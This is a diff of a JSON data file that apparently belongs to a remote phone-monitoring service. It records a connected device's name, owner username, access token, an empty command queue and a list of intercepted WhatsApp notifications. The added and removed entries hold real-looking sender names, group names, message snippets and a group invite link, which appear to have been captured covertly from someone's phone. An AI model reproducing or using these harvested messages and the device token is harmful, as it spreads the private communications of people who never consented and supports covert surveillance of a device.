@@ -22,6 +22,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎STOKK || NIAGA STORE🛒 (11 pesan): ~ tanz",
+        "content": "🔗 JB TANZ X REVAN STORE 1# | https://chat.whatsapp.com/IBjBHuyGAuA1l1WG0aQicy?mode=gi_t",
+        "time": "28/04 19:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777374511211
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1436 pesan dari 17 chat",
+        "time": "28/04 19:19",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777374505762
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (64 pesan): ~ Raffa Faris",
         "content": "Hitam kan wakk",
         "time": "28/04 19:19",
@@ -4003,22 +4019,6 @@
         "time": "28/04 19:06",
         "pkg": "com.whatsapp",
         "receivedAt": 1777373743909
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1317 pesan dari 16 chat",
-        "time": "28/04 19:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777373743754
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗣𝗔𝗦𝗨𝗞𝗔𝗡 𝗣𝗘𝗡𝗚𝗛𝗬𝗧𝗔𝗠𝗔𝗡 (16 pesan): ~ ￶",
-        "content": "berhenti mengejar ✅",
-        "time": "28/04 19:06",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777373743322
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777374505269,
+    "lastSeen": 1777374509463,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
